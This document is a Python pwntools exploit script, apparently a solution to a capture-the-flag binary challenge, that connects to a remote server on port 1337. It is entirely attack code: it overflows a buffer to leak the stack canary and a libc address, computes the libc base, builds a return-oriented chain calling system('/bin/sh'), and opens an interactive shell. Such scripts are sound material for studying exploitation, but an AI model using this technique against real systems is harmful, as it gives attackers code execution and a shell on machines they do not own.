from pwn import *
from pwnlib.rop import gadgets
context.encoding = 'latin'
context.binary = "./chall"

# io = process("./chall")
libc = ELF("./libc.so.6")
# io = gdb.debug("./chall_patched")
io = remote("45.153.243.57", 1337)
CANARY_OFFSET = 72
RIP_OFFSET = CANARY_OFFSET + 16
LIBC_OFFSET = 88 # offset for sth in libc

def one_gadgets(filename, base_addr=0):
    return [
        (int(i) + base_addr)
        for i in subprocess.check_output(["one_gadget", "--raw", "-l0", filename])
        .decode()
        .split(" ")
    ]

io.clean()
io.sendline("200")
io.clean()
io.send("A" * (CANARY_OFFSET + 1))
io.recvuntil("A" * (CANARY_OFFSET + 1))
canary = b"\x00" + io.recvuntil("\n")[:-2]
canary = u64(canary)
info(f"Leaked Canary @ {hex(canary)}")
io.clean()
io.sendline("1337")
io.clean()
io.sendline("200")
io.clean()
io.send("A" * LIBC_OFFSET)
io.recvuntil("A" * LIBC_OFFSET)
libc_leak = u64(io.recvuntil("\n").strip().ljust(8, b"\0"))
info(f"Leaked weird libc addr @ {hex(libc_leak)}")
libc_start_main = libc_leak + 48
info(f"libc_start_main @ {hex(libc_start_main)}")
libc.address = libc_start_main - libc.sym.__libc_start_main
onegadgets = one_gadgets(libc.path, libc.address)
io.clean()
io.sendline("1337")
io.clean()
io.sendline("200")
io.clean()

rop = ROP(libc)
rop.call(rop.ret[0])
rop.system(next(libc.search(b"/bin/sh\0")))
io.fit({CANARY_OFFSET: canary, RIP_OFFSET: rop.chain()})
io.clean()
io.sendline("1")
io.interactive()
